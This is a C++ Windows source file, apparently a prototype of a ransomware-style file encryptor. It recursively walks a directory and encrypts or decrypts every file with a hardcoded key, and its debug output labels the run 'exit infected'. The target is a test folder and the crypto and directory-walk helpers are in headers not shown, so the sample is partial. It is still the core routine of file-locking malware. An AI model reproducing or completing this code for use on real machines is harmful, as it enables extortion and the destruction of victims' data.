#include <iostream>

#include <stdio.h>
#include <stdlib.h>

#include <Windows.h>
#include <Winternl.h>

#include <io.h>


#include <string.h>

#include "common.h"
#include "find.h"
#include "crypt.h"

#include <time.h>
#include "dirent.h"

#include <fstream>

#include <Shlobj.h>


//#pragma warning(disable:4996)
//#pragma warning(suppress:4996)



#include <tchar.h> 
#include <stdio.h>
#include <strsafe.h>
#pragma comment(lib, "User32.lib")

using namespace std;

/*
std::string GetLastErrorAsString()
{
	//Get the error message, if any.
	DWORD errorMessageID = ::GetLastError();
	if (errorMessageID == 0)
		return std::string(); //No error message has been recorded

	LPSTR messageBuffer = NULL;
	size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

	std::string message(messageBuffer, size);

	//Free the buffer.
	LocalFree(messageBuffer);

	return message;
}
*/

bool _stdcall Encrypt(wchar_t *dir, void *arg) {
	
	if (is_file_protected(dir)) return false;

#if _DEBUG
	m_wprintf(L"%s - open\n", dir);
#endif
	
	bool r = crypt_block(dir, (wchar_t*)arg, FALSE);  //Encrypt

#if _DEBUG
	wchar_t buf[512];
	if (r) {
		m_wprintf(L"%s - %s\n", dir, L"ok");
		_snwprintf(buf, sizeof(buf) - 1, L"%s - %s\n", dir, L"ok");
		append_file(L"log.txt", buf);
	}
	else {
		m_wprintf(L"%s - %s\n", dir, L"no");

		//_snwprintf(buf,sizeof(buf)-1,L"%s\n",dir);
		wcscpy(buf, dir);
		wcscat(buf, L"\n");
		append_file(L"log.txt", buf);
	}
#endif	

	return r;
}

bool _stdcall Decrypt(wchar_t *dir, void *arg) {

	if (is_file_protected(dir)) return false;
#if _DEBUG
	m_wprintf(L"%s - open\n", dir);
#endif

	bool r = crypt_block(dir, (wchar_t*)arg, TRUE);  //Decrypt
		
#if _DEBUG
	wchar_t buf[512];
	if (r) {
		m_wprintf(L"%s - %s\n", dir, L"ok");
		_snwprintf(buf, sizeof(buf) - 1, L"%s - %s\n", dir, L"ok");
		append_file(L"log.txt", buf);
	}
	else {
		m_wprintf(L"%s - %s\n", dir, L"no");

		//_snwprintf(buf,sizeof(buf)-1,L"%s\n",dir);
		wcscpy(buf, dir);
		wcscat(buf, L"\n");
		append_file(L"log.txt", buf);
	}
#endif	

	return r;
}

//findAndEncrypt
void EncryptFromPath(wchar_t* path, wchar_t* key) {

	find_dir(path, L"*.*", Encrypt, key);

#if _DEBUG
	m_wprintf(L"%s\n", L"exit infected");
#endif

}

//findAndDecrypt
void DecryptFromPath(wchar_t* path, wchar_t* key) {

	find_dir(path, L"*.*", Decrypt, key);

#if _DEBUG
	m_wprintf(L"%s\n", L"exit infected");
#endif
	
}


int main() {
	
	printf("0. Encrypt\n1. Decrypt\n->");
	int x;
	cin >> x;

	if (x == 0)
		EncryptFromPath(L"D:\\test",L"3igcZhRdWq96m3GUmTAiv9");
	else
		DecryptFromPath(L"D:\\test",L"3igcZhRdWq96m3GUmTAiv9");

	return 0;
	
}